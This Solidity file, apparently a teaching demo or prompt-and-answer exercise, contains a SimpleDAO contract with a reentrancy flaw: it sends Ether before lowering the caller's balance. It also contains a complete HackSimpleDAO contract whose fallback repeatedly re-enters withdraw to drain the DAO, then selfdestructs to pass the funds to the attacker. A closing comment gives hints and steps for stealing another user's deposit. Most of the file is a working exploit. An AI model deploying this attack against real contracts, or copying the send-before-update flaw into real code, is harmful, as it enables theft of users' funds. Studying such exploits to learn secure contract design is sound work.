// SPDX-License-Identifier: MIT

// Demo: Hack SimpleDAO
// Write an attack contract in solidity to steal funds from the following SimpleDAO contract.
pragma solidity ^0.7.1;

contract SimpleDAO {
    mapping(address => uint) public balance;
 
    function deposit() public payable {
        balance[msg.sender] += msg.value;
    }

    function withdraw(uint amount) public {
       require(balance[msg.sender] >= amount, "not enough balance");
       (bool sent, ) = payable(msg.sender).call{value:amount}("");
       require(sent, "Failed to send Ether");
       balance[msg.sender] -= amount;
    }
    
    // helper function
    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
}
// Here is an example of how to hack SimpleDAO:

interface SimpleDAOInterface {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract HackSimpleDAO {
    SimpleDAO public simpleDAO;

    
    constructor(address _simpleDAOAddr) {
        simpleDAO = SimpleDAO(_simpleDAOAddr);
    }
    
    function hack() public payable {
        simpleDAO.deposit{value:1 ether}();
        simpleDAO.withdraw(1 ether);
        
        selfdestruct(payable(msg.sender));
    }

    fallback () external payable {
        if (address(simpleDAO).balance >= 1 ether) {
            simpleDAO.withdraw(1 ether);
        }
    }
    
    
    // helper function
    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
}

/**
  * Create an interface so it's easy to call methods on the SimpleDAO contract. Note: in interfaces you need to change public to external
  * Your attack contract will need to have a fallback method, and probably also another method to trigger the attack.
  * You can not use a single-use contract for this hack since your contract's fallback function doesn't exist until the constructor returns. But you can still selfdestruct() the contract later if you want.
  * Be careful not to transfer too much out of the SimpleDAO. If you try to transfer more than its entire balance, your transaction will fail.
  * For testing, deploy the SimpleDAO contract and deposit some funds. Then, with a separate account, steal the funds deposited by the original user.
  */
